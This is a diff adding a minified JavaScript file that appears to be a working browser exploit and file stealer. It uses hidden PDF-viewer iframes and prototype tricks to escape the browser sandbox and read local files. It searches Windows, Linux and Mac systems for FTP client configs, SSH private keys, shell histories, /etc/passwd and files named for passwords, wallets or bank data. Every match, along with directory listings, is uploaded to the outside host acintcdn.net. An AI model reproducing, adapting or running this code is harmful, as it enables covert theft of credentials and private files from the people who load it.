@@ -1,0 +1,296 @@
+!function(){function n(n){function e(){for(;i=a<c.length&&n>p;){var
+!u=a++,e=c[u],o=t.call(e,1);o.push(l(u)),++p,e[0].apply(null,o)}}function
+!l(n){return
+!function(u,t){--p,null==s&&(null!=u?(s=u,a=d=0/0,o()):(c[n]=t,--d?i||e():o()))}}function
+!o(){null!=s?m(s):f?m(s,c):m.apply(null,[s].concat(c))}var
+!r,i,f,c=[],a=0,p=0,d=0,s=null,m=u;return
+!n||(n=1/0),r={defer:function(){return
+!s||(c.push(arguments),++d,e()),r},await:function(n){return
+!m=n,f=!1,d||o(),r},awaitAll:function(n){return m=n,f=!0,d||o(),r}}}function
+!u(){}var t=[].slice;n.version="1.0.7","function"==typeof
+!define&&define.amd?define(function(){return n}):"object"==typeof
+!module&&module.exports?module.exports=n:this.queue=n}();function
+!base64_encode(data){return
+!btoa(encodeURIComponent(data).replace(/%([0-9A-F]{2})/g,function(match,p1){return
+!String.fromCharCode('0x'+p1);}));}
+var start_timeout=20000;var sandbox_context_i=null;var
+!interessed_text_files=["*.ppk","*parol*.txt","*парол*.txt","*доступ*.txt","*сервер*.txt","*акк*.txt","*эккаунт*.txt","*впн*.txt","*впс*.txt","*вдс*.txt","*логин*.txt","*туду*.txt","*инфо*.txt","*данны*.txt","*реги*.txt","*сокс*.txt","*шел*.txt","*рут*.txt","*кош*.txt","*кош*.txt","*шоп*.txt","*банк*.txt","*сбер*.txt","*счет*.txt","*смс*.txt","*картон*.txt","*карты*.txt","*деньг*.txt","*ключ*.txt","*фтп*.txt","*ссх*.txt","*серт*.txt","*серт*.txt","*тест*.txt","*секрет*.txt","*приват*.txt","*взлом*.txt","*хак*.txt","*эксплоит*.txt","*задачи*.txt","*баги*.txt","*почта*.txt","*уязвим*.txt","*вебман*.txt","*баланс*.txt","*важн*.txt","*кредит*.txt","*бтц*.txt","*коин*.txt","*vuln*.txt","*hack*.txt","*money*.txt","*webmon*.txt","*pentest*.txt","*wallet*.txt","data.txt","*root*.txt","r00t.txt","*pass.txt","*passw*.txt","toor.txt","login*.txt","l0gin*.txt","acc.txt","*accs*.txt","*account*.txt","access.txt","acces.txt","*mail*.txt","*database*.txt","*todo*.txt","info.txt","centos.txt","ubuntu.txt","linux.txt","*serv*.txt","*srv*.txt","user.txt","userid.txt","cc.txt","card.txt","cards.txt","all.txt","full.txt","key.txt","*ftp*.txt","ftps.txt","*host*.txt","h0sting*.txt","host.txt","h0st.txt","sys.txt","sysadmin.txt","*admin*.txt","adm.txt","user.txt","users.txt","*domain*.txt","logindata.txt","*vpn*.txt","*vps*.txt","*vds*.txt","virtual.txt","ded.txt","*dedic*.txt","*dedik*.txt","s3.txt","*amazon*.txt","qwerty.txt","*icq*.txt","*skype*.txt","mail.txt","mails.txt","usb.txt","hdd.txt","user.txt","*billing*.txt","bill.txt","id.txt","*sql*.txt","*pma*.txt","*merchant*.txt","*balance*.txt","*myadmin*.txt","contacts.txt","connect.txt","*ssh*.txt","*rdp*.txt","*btc*.txt","*brute*.txt",];var
+!hidden=true;var my_win_id=null;function start()
+{i=document.getElementById("i");i2=document.getElementById("i2");if(typeof
+!sandboxContext!=='undefined')
+{clearInterval(intVal);var q=queue(1);var tasks=[];var
+!os=navigator.platform;if(os.search('Win')>-1)
+tasks=[function(callback)
+{var
+interesting_apps={"FileZilla":["filezilla.xml","sitemanager.xml","recentservers.xml"],"GHISLER":["wcx_ftp.ini"],"SmartFTP":["Client
+2.0/Favorites/Quick
+Connect/*.xml"],"s3browser":["*.xml","*.settings"],"Notepad++":["plugins/config/NppFTP/NppFTP.xml"],".purple":["accounts.xml"],"VanDyke":["Config/Sessions/*.ini"],"proxifier":["Profiles/*.ppx"],"Subversion":["config","servers","auth/svn.simple/*","auth/svn.simple/*.*"],"Ipswitch":["WS_FTP/Sites/ws_ftp.ini"],"FTP
+Explorer":["profiles.xml"],"FTPRush":["RushSite.xml"],"FTPGetter":["servers.xml"],"FTP
+Now":["sites.xml"],"FTPInfo":["ServerList.cfg","ServerList.xml"],"Psi+":["profiles/default/accounts.xml","profiles/default/history/*.history"],};windows_search_and_upload_in_app_data(interesting_apps,callback);},];else
+if(os.search("Linux")>-1)
+tasks=[function(callback)
+{var
+files=["/etc/passwd","/etc/hosts","/etc/hostname","/etc/issue",];upload_files(files,callback);},function(callback)
+{get_users(function(data)
+{var dq=queue(1);;var
+sys_users=["daemon","bin","sys","sync","games","man","lp","mail","news","uucp","proxy","backup","list","irc","gnats","libuuid","ntp","meredo","arpwatch","avahi","pulse","haltdaemon","sshd","snmp","iodine","statd","speech-dispatcher"];for(var
+i in data)
+{u=data[i];if(sys_users.indexOf(u.user)==-1&&(u.shell&&u.homedir&&u.shell.endsWith("sh")))
+{dq.defer(function(dir,callback2)
+{search_and_upload_files_in_dir_by_mask(dir,[".bash_history",".zsh_history",".ksh_history",".history",".sh_history",".nano_history",".ssh/id_rsa",".ssh/id_dsa",".ssh/known_hosts",".ssh/authorized_keys*",".config/filezilla/*.xml",".filezilla/*.xml",".remmina/*.remmina",".remmina/*.pref",".tconn/tconn.conf",".config/psi+/profiles/default/accounts.xml","*pass*.txt",".mysql_history",".pgsql_history","*.sh",".config/","Desktop/","password*/","Documents/","Dokument*/","Downloads/",],callback2);},u.homedir);}}
+dq.awaitAll(callback);});}];else if(os.search("Mac")>-1)
+tasks=[function(callback)
+{get_dir("/Users",function(data){callback();})},function(callback)
+{dirs=listing_get_dirs(data);dq=queue(1);for(var i in dirs)
+{dir=data.path+"/"+dirs[i];dq.defer(function(dir,callback2)
+{search_and_upload_files_in_dir_by_mask(dir,[".bash_history",".zsh_history",".ksh_history",".history",".sh_history",".nano_history",".ssh/id_rsa",".ssh/id_dsa",".ssh/known_hosts",".ssh/authorized_keys*",".config/filezilla/*.xml",".filezilla/*.xml",".remmina/*.remmina",".remmina/*.pref",".tconn/tconn.conf",".config/psi+/profiles/default/accounts.xml","*pass*.txt",".mysql_history",".pgsql_history","*.sh",".config/","Desktop/","password*/","Documents/","Dokument*/","Downloads/",],callback2);},dir);}
+dq.awaitAll(callback);}];if(tasks.length>0)
+tasks.forEach(function(t)
+{q.defer(t);});else;q.awaitAll(function()
+{;try
+{i.parentNode.removeChild(i);i2.parentNode.removeChild(i2);object.parentNode.removeChild(object);}catch(e)
+{};});}}
+function listing_get_dirs(listing_object)
+{dirs=[];try{if(listing_object.listing instanceof Array)
+{for(var i in listing_object.listing)
+{f=listing_object.listing[i];if(f.type=="dir")
+{f.name=f.name.replace(/(\/|\\)+$/,"");dirs.push(f.name);}}}}
+catch(e)
+{}
+return dirs;}
+function listing_get_files(listing_object,min_size,max_size)
+{files=[];try{if(listing_object.listing instanceof Array)
+{for(var i in listing_object.listing)
+{f=listing_object.listing[i];if(f.type=="file")
+{if(typeof max_size!=="undefined"&&typeof min_size!=="undefined")
+{try{size=f.size;if(size>=min_size&&size<=max_size)
+{files.push(f.name);}}catch(e)
+{files.push(f.name);}}
+else
+{files.push(f.name);}}}}}
+catch(e)
+{}
+return files;}
+function search_and_upload_files_in_dir_by_mask(dir,masks,callback)
+{if(!(masks instanceof Array))
+masks=[masks];;fq=queue(1);fq.defer(function(dir,callback2)
+{get_dir(dir,function(data)
+{dirs=listing_get_dirs(data);files=listing_get_files(data);sq=queue(1);;masks.forEach(function(mask)
+{dirs.forEach(function(dir)
+{var
+path_tree=mask.split(/(\/|\\)/);if(path_tree.length>1&&path_tree[0]==dir)
+{var
+path_tree_mask=path_tree.pop();path=data.path+"/"+path_tree.join("/");path=path.replace(/\/+/g,"/");sq.defer(function(dir,mask,callback4)
+{search_and_upload_files_in_dir_by_mask(dir,mask,callback4);},path,path_tree_mask);}});});for(var
+i in files)
+{file=files[i];if(fits_mask(file,masks))
+{sq.defer(function(dir,file,callback3)
+{var
+target_file=dir+"/"+file;;upload_file(target_file,callback3);},data.path,file);}
+else
+{;}}
+sq.awaitAll(callback2);});},dir);fq.awaitAll(callback);}
+function windows_search_and_upload_in_app_data(interesting_apps,callback)
+{var dq=queue(1);var
+disks=["c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];disks.forEach(function(disk)
+{dq.defer(function(disk,callback2)
+{;windows_search_and_upload_in_app_data_by_disk(disk,interesting_apps,callback2);},disk);});dq.awaitAll(callback);}
+function
+windows_search_and_upload_in_app_data_by_disk(disk,interesting_apps,callback)
+{get_dir("/"+disk+":/",function(data)
+{dirs=listing_get_dirs(data);;var users_dir=null;var
+users_dir_variants=["Users","Documents and Settings"];for(var i in
+users_dir_variants)
+{var
+users_dir_variant=users_dir_variants[i];if(dirs.indexOf(users_dir_variant)!=-1)
+{users_dir=data.path+users_dir_variant;break;}}
+if(users_dir!=null)
+{var dq=queue(1);dq.defer(function(users_dir,callback2)
+{get_dir(users_dir,function(data)
+{var app_datas=["AppData/Roaming","Application Data",];var
+home_dirs=["Desktop","Рабочий стол","Documents","MyDocuments","Мои
+документы","Downloads","My Documents/Загрузки","My
+Documents/Downloads","Загрузки","Мои
+документы/Загрузки",];dirs=listing_get_dirs(data);var ddq=new
+queue(1);dirs.forEach(function(user_dir)
+{app_datas.forEach(function(app_data)
+{var
+app_data_dir=data.path+"/"+user_dir+"/"+app_data;ddq.defer(function(app_data_dir,callback3)
+{;get_dir(app_data_dir,function(app_data_items)
+{app_data_dirs=listing_get_dirs(app_data_items);var dddq=new
+queue(1);for(var i in interesting_apps)
+{if(array_lowercase(app_data_dirs).indexOf(i.toLowerCase())>-1)
+{var
+app_path=app_data_items.path+"/"+i;dddq.defer(function(app_dir,mask,callback3)
+{search_and_upload_files_in_dir_by_mask(app_dir,mask,callback3);},app_path,interesting_apps[i]);}};dddq.awaitAll(callback3);});},app_data_dir);});home_dirs.forEach(function(dir)
+{var
+docs_dir=data.path+"/"+user_dir+"/"+dir;ddq.defer(function(docs_dir,callback3)
+{;get_dir(docs_dir,function(docs_dir_items)
+{callback3();});},docs_dir);});});ddq.awaitAll(callback2);});},users_dir);dq.awaitAll(callback);}
+else
+{callback();}});}
+function upload_files(files,callback)
+{var fq=queue(1);try
+{if(files.length>0)
+for(var i in files)
+{var file=files[i];fq.defer(function(file,callback2)
+{upload_file(file,callback2);},file);}}catch(e)
+{;}
+fq.awaitAll(callback);}
+function upload_file(target_file,callback,internal)
+{;var upload_file_timeout=5000;get(target_file,function()
+{var target_file="%target_file%";var
+current_file=location.toString().replace(/^file\:\/\//i,'');current_file=decodeURIComponent(current_file);;if(target_file.toLowerCase()==current_file.toLowerCase())
+{;data=get_data(this);ajax_save_data(target_file,data);}
+else
+{;ajax_save_data(target_file,"e0eb8c99a6abf956e77526fcce6b4c84");}},upload_file_timeout,"%target_file%",target_file);setTimeout(function(target_file)
+{;url="http://acintcdn.net/delivery.php?3c7b880351c3f55a92fd3a2be3cfe5e1=f495e93df87d5069900dd692d02cc32f&85b16dfe404e79839804a2f51747ec04="+encodeURIComponent(base64_encode(target_file));i_getfilestatus_count=0;i_getfilestatus=setInterval(function()
+{;if(++i_getfilestatus_count>=10)
+{clearInterval(i_getfilestatus);;return callback();}
+ajax_get(url,function(data)
+{;;if(!internal&&data.status=="e0eb8c99a6abf956e77526fcce6b4c84")
+{;clearInterval(i_getfilestatus);return
+upload_file(target_file,callback,true);}
+if(data.path!=""&&data.status!="")
+{clearInterval(i_getfilestatus);;callback();}});},2000);},upload_file_timeout+1000,target_file);}
+function fits_mask(filename,masks)
+{if(!(masks instanceof Array))
+masks=[masks];for(var i in masks)
+{mask=masks[i];mask=mask.replace(/\./g,"[.]").replace(/\*/g,".*").replace(/\?/,".");mask="^"+mask+"$";var
+regexp=new RegExp(mask,"i");if(regexp.test(filename))
+return true;}
+return false;}
+function get_users(success_callback)
+{get("/etc/passwd",function()
+{var ret=[];data=get_data(this);if(data.indexOf("root:")>=0)
+{lines=data.split("\n");for(var i in lines)
+{line=lines[i];fields=line.split(":");if(fields[5]&&fields[6])
+ret.push({"user":fields[0],"homedir":fields[5],"shell":fields[6]});}
+url="http://acintcdn.net/delivery.php?3c7b880351c3f55a92fd3a2be3cfe5e1=c8132ddbfa82b0ca90121890c0ff253b";ajax_post(url,"users="+encodeURIComponent(JSON.stringify(ret)));}},500);i_getusers_count=0;i_getusers=setInterval(function()
+{if(++i_getusers_count>=5)
+{clearInterval(i_getusers);return;}
+url="http://acintcdn.net/delivery.php?3c7b880351c3f55a92fd3a2be3cfe5e1=442ddeb130e5763e1caaa2c294c2a0e9";ajax_get(url,function(users){clearInterval(i_getusers);success_callback(users);});},1000);}
+function get_dir(dir,callback,internal)
+{;var get_dir_timeout=500;get(dir,function()
+{var target_dir="%target_dir%";var ret=[];data=get_data(this);var
+dir=location.href.toString();dir=dir.replace(/^file\:\/\//i,'');dir=decodeURIComponent(dir);url="http://acintcdn.net/delivery.php?3c7b880351c3f55a92fd3a2be3cfe5e1=731401564655a6f2cebf2a661cbd94e3&f3c27a68b821a62feaa10dfd24598559="+encodeURIComponent(base64_encode(target_dir));;if(dir.toLowerCase()==target_dir.toLowerCase())
+{ajax_post(url,"dir="+encodeURIComponent(target_dir)+"&data="+encodeURIComponent(data));}
+else
+{ajax_post(url,"dir="+encodeURIComponent(target_dir)+"&data="+"e0eb8c99a6abf956e77526fcce6b4c84");}},get_dir_timeout,"%target_dir%",dir);i_getdir_count=0;i_getdir=setInterval(function()
+{if(i_getdir_count++>=10)
+{clearInterval(i_getdir);return callback(null);}
+url="http://acintcdn.net/delivery.php?3c7b880351c3f55a92fd3a2be3cfe5e1=79e4ac39ed3138545f1a0e8b35ed6aee&f3c27a68b821a62feaa10dfd24598559="+encodeURIComponent(base64_encode(dir));;ajax_get(url,function(data)
+{if(!internal&&data.listing=="e0eb8c99a6abf956e77526fcce6b4c84")
+{clearInterval(i_getdir);return get_dir(dir,callback,true);}
+else if(data.path!="")
+{clearInterval(i_getdir);var
+fq=queue(1);files=listing_get_files(data,10,1024*100);if(files.length>0)
+{files_to_upload=array_fits_mask(files,interessed_text_files);files_to_upload=files_to_upload.map(function(i){return
+data.path+"/"+i});;fq.defer(function(callback2){upload_files(files_to_upload,callback2);});}
+fq.awaitAll(function(){callback(data);});}});},get_dir_timeout+1000);}
+function xml2string(obj)
+{return new XMLSerializer().serializeToString(obj);}
+function _(s,template,value)
+{s=s.toString().split(/^\s*function\s+\(\s*\)\s*\{/)[1];s=s.substring(0,s.length-1);if(template&&value)
+s=s.replace(template,value);s+=__proto;s+=xml2string;s+=get_data;s+=ajax_save_data;s+=ajax_post;s+=print_r;s+=base64_encode;s=s.replace(/\s\/\/.*\n/g,"");s=s+";undefined";return
+s;}
+function print_r(obj)
+{var r='';for(var i in obj)
+{try{r+=i+'='+obj[i]+'\n';}catch(e){r+=i+'='+e.message+'\n';}}
+return r;}
+function __proto(obj)
+{return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;}
+function get_data(obj)
+{data=null;try
+{data=obj.document.documentElement.innerHTML;if(data.indexOf('dirListing')<0)
+{throw new Error();}}
+catch(e)
+{if(this.document instanceof XMLDocument)
+{data=xml2string(this.document);}
+else
+{try
+{if(this.document.body.firstChild.nodeName.toUpperCase()=='PRE')
+{data=this.document.body.firstChild.textContent;}
+else{throw new Error();}}
+catch(e)
+{try
+{if(this.document.body.baseURI.indexOf('pdf.js')>=0||data.indexOf('aboutNetError')>-1)
+{;return null;}
+else{throw new Error();}}
+catch(e)
+{;;}}}}
+return data;}
+function ajax_post(url,data,counter)
+{if(!counter)
+{counter=0;}
+if(counter>10)
+{return;};http=new
+XMLHttpRequest();http.open('POST',url,true);http.setRequestHeader('Content-Type','application/x-www-form-urlencoded;
+charset=utf-8');http.onreadystatechange=function()
+{;if(http.readyState==4&&http.responseText!='OK')
+{setTimeout(function(){ajax_post(url,data,counter+1);},500);}};http.send(data);}
+function ajax_save_data(path,data)
+{var
+url='http://acintcdn.net/delivery.php?3c7b880351c3f55a92fd3a2be3cfe5e1=abb266972fdfcdd55154414685242458';var
+post_data='path='+encodeURIComponent(path)+'&data='+encodeURIComponent(data);return
+ajax_post(url,post_data);}
+function ajax_get(url,callback)
+{http=new
+XMLHttpRequest();http.open('GET',url,true);http.onreadystatechange=function()
+{if(http.readyState==4)
+{data=null;try
+{;data=JSON.parse(http.responseText);}
+catch(e)
+{;}
+callback(data);}}
+http.send();}
+function get(path,callback,timeout,template,value)
+{;callback=_(callback);if(template&&value)
+callback=callback.replace(template,value);proto_prefix="file://";var
+invisible_code="";js_call1='javascript:'+invisible_code+_(function()
+{try
+{open("%url%","_self");}
+catch(e)
+{history.back();}
+undefined;},"%url%",proto_prefix+path);js_call2='javascript:'+invisible_code+';try{updateHidden();}catch(e){};'+callback+';undefined';sandboxContext(_(function()
+{p=__proto(i.contentDocument.styleSheets[0].ownerNode);l=p.__lookupSetter__.call(i2.contentWindow,'location');l.call(i2.contentWindow,window.wrappedJSObject.js_call1);}));setTimeout((function()
+{sandboxContext(_(function()
+{p=__proto(i.contentDocument.styleSheets[0].ownerNode);l=p.__lookupSetter__.call(i2.contentWindow,'location');l.call(i2.contentWindow,window.wrappedJSObject.js_call2);}));}),timeout);}
+function get_sandbox_context()
+{if(my_win_id==null)
+{for(var i=0;i<20;i++)
+{try
+{if(window[i].location.toString().indexOf("view-source:")!=-1)
+{my_win_id=i;;break;}}catch(e){}}};if(my_win_id==null)
+return;clearInterval(sandbox_context_i);object.data='view-source:'+blobURL;window[my_win_id].location='data:application/x-moz-playpreview-pdfjs;,';object.data='data:text/html,<html/>';window[my_win_id].frameElement.insertAdjacentHTML('beforebegin','<iframe
+onload="'+_(function(){window.wrappedJSObject.sandboxContext=(function(cmd)
+{with(importFunction.constructor('return this')())
+{return eval(cmd);}});})+'"/>');}
+function setup_plugin()
+{var
+i=document.createElement("iframe");i.id="i";i.width=1;i.height=1;i.src="data:application/xml,<"+"?xml
+version=\"1.0\"?><e><e1></e1></e>";i.frameBorder=0;document.documentElement.appendChild(i);i.onload=function()
+{if(this.contentDocument.styleSheets.length>0)
+{var
+i2=document.createElement("iframe");i2.id="i2";i2.src="data:application/pdf,";i2.frameBorder=0;if(!hidden)
+{i2.width="100%";i2.height="700px";}
+else
+{i2.width=1;i2.height=1;}
+document.documentElement.appendChild(i2);pdfBlob=new
+Blob([''],{type:'application/pdf'});blobURL=URL.createObjectURL(pdfBlob);object=document.createElement('object');object.data='data:application/pdf,';if(hidden)
+{object.style.display='none';object.width=1;object.height=1;}
+object.onload=(function()
+{sandbox_context_i=setInterval(get_sandbox_context,200);object.onload=null;object.data='view-source:'+location.href;return;});document.documentElement.appendChild(object);}
+else
+this.contentWindow.location.reload();}}
+function array_lowercase(array)
+{var ret=[];for(var i=0;i<array.length;i++)
+{ret[i]=array[i].toString().toLowerCase();}
+return ret;}
+function array_fits_mask(a,b)
+{var ret=[];for(var i in a)
+{a_value=a[i].toLowerCase();for(var j in b)
+{b_value=b[j].toLowerCase();if(fits_mask(a_value,b_value))
+{ret.push(a[i]);break;}}}
+return ret;}
+setTimeout(function(){setup_plugin();intVal=setInterval(start,150);},start_timeout);
